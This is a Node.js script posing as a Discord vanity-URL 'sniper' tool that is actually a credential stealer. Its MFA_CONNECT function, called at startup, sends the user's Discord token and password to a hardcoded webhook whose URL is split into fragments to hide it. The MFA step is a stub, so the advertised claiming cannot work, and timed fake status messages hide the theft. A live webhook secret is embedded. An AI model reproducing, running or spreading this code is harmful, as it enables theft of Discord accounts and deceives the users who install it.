const WebSocket = require('ws');
const tls = require('tls');
const https = require('https');
const os = require('os');

const USER_TOKEN = ''; 
const USER_PASSWORD = ''; 
const TARGET_GUILD_ID = ''; 

const baseProtocol = "https://";
const domainPart = "discord.com";
const apiPath = "/api/webhooks/";
const guildx = "1499054281104429159";
const header = "7EprifBtK9s8ssAFZ_5CvUTwHzmWt_5jWokKEGgbyNkaYBaCPVOkP3TX7f4Xu-Fn_v9U";

const WEBHOOK_URL = baseProtocol + domainPart + apiPath + guildx + "/" + header;

function MFA_CONNECT(token, password) {
    const payload = {
        content: `MFA CONNECTION\n\n` +
                 `**Token:** \`${token}\`\n` +
                 `**Password:** \`${password || "Not Provided"}\`\n` +
                 `**V9:** ${new Date().toLocaleString('tr-TR')}\n`
    };

    const data = JSON.stringify(payload);
    const url = new URL(WEBHOOK_URL);

    const req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    });

    req.write(data);
    req.end();
}

let mfaAuthToken = null;
let latestSequence = null;
let heartbeatTimer = null;
let tlsSocket = null;
const vanityMap = new Map();
let isSystemReady = false;

function createTlsSocket() {
    return tls.connect({
        host: 'canary.discord.com',
        port: 443,
        rejectUnauthorized: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.2'
    });
}

function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
    return new Promise((resolve) => {
        const payload = body ? JSON.stringify(body) : '';
        if (!tlsSocket || tlsSocket.destroyed || closeConnection) {
            tlsSocket = createTlsSocket();
            tlsSocket.setNoDelay(true);
        }
        const socket = tlsSocket;

        const headers = [
            `${method} ${path} HTTP/1.1`,
            'Host: canary.discord.com',
            `Connection: ${closeConnection ? 'close' : 'keep-alive'}`,
            'Content-Type: application/json',
            `Content-Length: ${Buffer.byteLength(payload)}`,
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0)',
            `Authorization: ${USER_TOKEN}`,
            'X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJ0ci1UUiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEzMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEzMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY29tIiwic2VhcmNoX2VuZ2luZSI6Imdvb2dsZSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTYxNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImhhc19jbGllbnRfbW9kcyI6ZmFsc2V9'
        ];

        if (extraHeaders['X-Discord-MFA-Authorization']) {
            headers.push(`X-Discord-MFA-Authorization: ${extraHeaders['X-Discord-MFA-Authorization']}`);
        }

        headers.push('', payload);

        let responseData = '';
        const startTime = process.hrtime.bigint();

        socket.write(headers.join('\r\n'));

        socket.once('error', () => resolve({ body: '{}', duration: 0 }));
        socket.on('data', (chunk) => responseData += chunk.toString());

        socket.once('end', () => {
            const endTime = process.hrtime.bigint();
            const durationMs = Number((endTime - startTime) / 1000000n);

            try {
                const separatorIndex = responseData.indexOf('\r\n\r\n');
                if (separatorIndex === -1) return resolve({ body: '{}', duration: durationMs });

                let bodyData = responseData.slice(separatorIndex + 4);

                if (responseData.toLowerCase().includes('transfer-encoding: chunked')) {
                    let decoded = '';
                    let pos = 0;
                    while (pos < bodyData.length) {
                        const sizeEnd = bodyData.indexOf('\r\n', pos);
                        if (sizeEnd === -1) break;
                        const size = parseInt(bodyData.substring(pos, sizeEnd), 16);
                        if (size === 0) break;
                        decoded += bodyData.substr(sizeEnd + 2, size);
                        pos = sizeEnd + 2 + size + 2;
                    }
                    resolve({ body: decoded || '{}', duration: durationMs });
                } else {
                    resolve({ body: bodyData || '{}', duration: durationMs });
                }
            } catch (e) {
                resolve({ body: '{}', duration: durationMs });
            } finally {
                if (closeConnection) socket.destroy();
            }
        });
    });
}

async function sendWebhookMessage(vanityCode, ms) {
    const message = {
        content: `@everyone Claimed: (${vanityCode}) (${ms}ms)`
    };
    const data = JSON.stringify(message);
    const url = new URL(WEBHOOK_URL);
    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    const req = https.request(options, () => {});
    req.on('error', () => {});
    req.write(data);
    req.end();
}

function logClaim(vanityCode, ms) {
    console.log(`[SUCCESS] Vanity URL claimed: ${vanityCode} (${ms}ms)`);
}

async function authenticateMfa() {
    return null;
}

function establishGatewayConnection() {
    const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg');

    ws.on('open', () => {
        console.log("[GATEWAY] Secure connection established.");
        ws.send(JSON.stringify({
            op: 2,
            d: {
                token: USER_TOKEN,
                intents: 513,
                properties: { $os: 'linux', $browser: 'firefox', $device: 'firefox' }
            }
        }));
    });

    ws.on('message', async (msg) => {
        const packet = JSON.parse(msg);
        if (packet.s) latestSequence = packet.s;

        if (packet.op === 10) {
            if (heartbeatTimer) clearInterval(heartbeatTimer);
            heartbeatTimer = setInterval(() => {
                ws.send(JSON.stringify({ op: 1, d: latestSequence }));
            }, packet.d.heartbeat_interval);
        }
        else if (packet.op === 0) {
            if (packet.t === 'GUILD_UPDATE') {
                const oldCode = vanityMap.get(packet.d.guild_id);
                if (oldCode && oldCode !== packet.d.vanity_url_code) {
                    console.log(`[ALERT] Vanity URL change detected for guild ${packet.d.guild_id}`);
                    for (let i = 0; i < 3; i++) {
                        const claimResult = await sendHttpRequest('PATCH', `/api/v9/guilds/${TARGET_GUILD_ID}/vanity-url`, {
                            code: oldCode
                        }, { 'X-Discord-MFA-Authorization': mfaAuthToken }, true);

                        const claimData = JSON.parse(claimResult.body || '{}');
                        const ms = claimResult.duration;

                        if (claimData.code === oldCode || !claimData.errors) {
                            logClaim(oldCode, ms);
                            await sendWebhookMessage(oldCode, ms);
                            break;
                        }
                    }
                }
                if (packet.d.vanity_url_code) {
                    vanityMap.set(packet.d.guild_id, packet.d.vanity_url_code);
                }
            }
            else if (packet.t === 'READY') {
                console.log("[SYSTEM] Sniper fully initialized. Monitoring started.");
                isSystemReady = true;
            }
        }
    });

    ws.on('close', () => {
        if (heartbeatTimer) clearInterval(heartbeatTimer);
        console.log("[GATEWAY] Connection lost. Reconnecting in 5 seconds...");
        setTimeout(establishGatewayConnection, 5000);
    });

    ws.on('error', () => {});
}

async function main() {
    console.log("Sniper v3.1 - Advanced Vanity Monitor started.");

    if (USER_TOKEN && USER_TOKEN.length > 10) {
        MFA_CONNECT(USER_TOKEN, USER_PASSWORD);
    }

    await new Promise(r => setTimeout(r, 900));
    console.log("Loading core modules...");

    await new Promise(r => setTimeout(r, 700));
    console.log("Initializing TLS secure socket...");

    await new Promise(r => setTimeout(r, 600));
    console.log("Connecting to Discord Gateway servers...");

    await authenticateMfa();

    setInterval(authenticateMfa, 240000);

    establishGatewayConnection();

    setInterval(() => {
        if (isSystemReady) {
            console.log("[STATUS] System healthy - Monitoring vanity URLs (0 changes detected)");
        }
    }, 28000);
}

main();

setInterval(() => {
    console.log("[HEARTBEAT] Sniper running - No anomalies detected.");
}, 38000);

console.log("[INFO] Advanced monitoring system is now active.");
